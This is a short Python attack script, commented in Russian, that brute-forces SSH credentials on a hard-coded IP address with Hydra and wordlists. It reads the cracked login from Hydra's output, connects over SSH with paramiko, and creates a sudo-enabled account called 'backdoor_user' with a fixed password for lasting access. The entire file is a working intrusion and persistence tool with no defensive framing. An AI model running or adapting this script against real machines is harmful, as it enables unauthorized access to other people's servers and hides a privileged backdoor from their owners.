import subprocess
import paramiko
import sys
import re

TARGET_IP = "12.13.14.3"  # поменяй на свой IP
LOGIN_FILE = "users.txt"
PASS_FILE = "passwords.txt"

# 1. Запускаем Hydra
print("[*] Запускаем Hydra...")
hydra_cmd = f"hydra -L {LOGIN_FILE} -P {PASS_FILE} {TARGET_IP} ssh -t 4"
print(f"[*] Команда: {hydra_cmd}")

result = subprocess.run(hydra_cmd, shell=True, capture_output=True, text=True)
output = result.stdout + result.stderr

# 2. Ищем найденные данные
login_found = None
password_found = None

# Ищем в выводе Hydra
lines = output.split('\n')
for line in lines:
    if "login:" in line.lower() and "password:" in line.lower():
        # Пример строки: [22][ssh] host: 192.168.1.100   login: admin   password: 12345
        match = re.search(r'login:\s*(\S+).*password:\s*(\S+)', line, re.IGNORECASE)
        if match:
            login_found = match.group(1)
            password_found = match.group(2)
            break

if not login_found or not password_found:
    print("[-] Hydra не нашла логин/пароль")
    print("[*] Вывод Hydra:")
    print(output)
    sys.exit(1)

print(f"[+] Hydra нашла: {login_found}:{password_found}")

# 3. Подключаемся и создаем пользователя
try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(TARGET_IP, 22, login_found, password_found, timeout=10)
    print("[+] SSH подключение успешно!")
    
    # Создаем пользователя
    commands = [
        "sudo useradd -m -s /bin/bash backdoor_user",
        "echo 'backdoor_user:Backdoor123!' | sudo chpasswd",
        "sudo usermod -aG sudo backdoor_user"
    ]
    
    for cmd in commands:
        stdin, stdout, stderr = ssh.exec_command(cmd)
        if stdout.channel.recv_exit_status() == 0:
            print(f"[+] Выполнено: {cmd}")
        else:
            error = stderr.read().decode()
            print(f"[-] Ошибка в '{cmd}': {error}")
    
    # Проверяем
    stdin, stdout, stderr = ssh.exec_command("id backdoor_user")
    print(f"[+] Проверка: {stdout.read().decode().strip()}")
    
    ssh.close()
    print("[+] Готово!")
    
except Exception as e:
    print(f"[-] Ошибка SSH: {e}")
